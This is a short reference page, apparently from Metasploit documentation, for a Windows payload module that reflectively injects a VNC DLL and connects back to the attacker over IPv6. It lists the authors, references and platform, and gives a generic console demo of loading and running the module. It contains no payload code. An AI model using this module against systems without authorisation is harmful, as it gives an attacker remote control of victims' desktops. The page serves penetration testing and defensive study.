## VNC Server (Reflective Injection), Reverse TCP Stager (IPv6)

Inject a VNC Dll via a reflective loader (staged). Connect 
back to the attacker over IPv6


## Module Name
payload/windows/vncinject/reverse_ipv6_tcp

## Authors
* sf
* hdm
* skape


## References
* https://github.com/stephenfewer/ReflectiveDLLInjection
* https://github.com/rapid7/ReflectiveDLLInjection




## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/vncinject/reverse_ipv6_tcp
msf payload(reverse_ipv6_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_ipv6_tcp) > set TARGET <target-id>
msf payload(reverse_ipv6_tcp) > show options
   ... show and set options ...
msf payload(reverse_ipv6_tcp) > run
```
    
    